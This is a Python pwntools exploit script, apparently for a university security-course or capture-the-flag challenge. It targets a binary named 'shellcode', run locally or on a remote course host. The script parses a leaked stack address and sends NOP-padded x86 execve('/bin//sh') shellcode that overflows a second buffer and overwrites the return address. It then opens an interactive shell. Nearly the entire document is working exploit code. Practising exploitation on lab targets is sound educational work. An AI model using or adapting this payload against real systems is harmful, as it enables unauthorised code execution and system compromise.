from pwn import *

local=True

if local:
    sh = process('./shellcode')
else:
    sh=remote("tpas.alunos.dcc.fc.up.pt",5002)

sh.recvuntil("> ")

sh.sendline("2")

inline = sh.recvline() # leaked address for buffer A
sh.recv() # Give me the first string:

leaked_addr = inline.split(":")[-1].strip().split(" ")[-1].strip()
print leaked_addr

eip = p32(int(leaked_addr, 16)) # p64 for 64 bits

#gdb.attach(sh)

# execve for scanf (bypass chars that terminate read before expected)
shellcode ="\x31\xc0\x50\x68"
shellcode +="\x2f\x2f\x73\x68"
shellcode +="\x68\x2f\x62\x69"
shellcode +="\x6e\x89\xe3\x50"
shellcode +="\x53\x89\xe1\x31"
shellcode +="\xc0\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\xcd\x80"

NOP = "\x90"

# lets send the shellcode in both buffers

# we have 100 bytes on the first buffer
# and we need to overflow the second buffer
offset = 212

attach(sh)

buf1_payload = NOP * 100
sh.sendline(buf1_payload)

sh.recv()
buf2_payload = shellcode.rjust(212, NOP) + eip

print "padded shellcode len", len(shellcode.rjust(212, NOP))
sh.sendline(buf2_payload)



# when we get a shell
sh.interactive()
